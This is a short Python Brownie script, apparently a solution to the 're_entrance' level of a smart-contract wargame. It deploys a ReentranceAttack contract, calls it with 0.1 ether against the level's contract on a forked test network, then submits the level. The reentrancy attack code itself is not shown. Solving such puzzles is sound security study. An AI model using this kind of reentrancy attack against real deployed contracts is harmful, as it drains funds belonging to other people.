from brownie import Reentrance, ReentranceAttack, web3

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "10_re_entrance"
INTERFACE_CONTRACT = Reentrance
INSTANCE_VALUE_WEI = web3.toWei(1, "ether")


def solve_level(level_contract):
    account = get_account()
    reentrance_attack = ReentranceAttack.deploy({"from": account})
    reentrance_attack.attack(
        level_contract.address, {"from": account, "value": web3.toWei(0.1, "ether")}
    )


# brownie run scripts/_10_re_entrancy.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
